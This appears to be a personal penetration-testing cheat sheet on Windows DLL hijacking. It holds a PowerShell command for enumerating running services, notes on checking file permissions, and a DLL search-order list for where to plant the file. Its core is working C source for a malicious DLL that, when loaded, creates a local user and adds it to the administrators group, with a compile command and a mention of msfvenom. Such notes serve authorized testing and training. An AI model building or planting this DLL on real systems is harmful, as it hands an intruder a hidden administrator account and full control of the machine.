# DLL HIJACK
#enum 

```powershell
#looking for programs outside of C:\Windows, ie manually installed

Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

#enum_permissions 
```
procmon to check for dlls
if don't haver  permissions install locally and use procmon
icacls [file]
```

#code 

```c
#compile: x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
#can use msfvenom as well

#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user [username] [password] /add");
  	    i = system ("net localgroup administrators [username] /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

#dll_search_order
```
#place dll in one of these

- The directory from which the application loaded.
- The system directory.
- The 16-bit system directory.
- The Windows directory. 
- The current directory.
- The directories that are listed in the PATH environment variable.
```
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking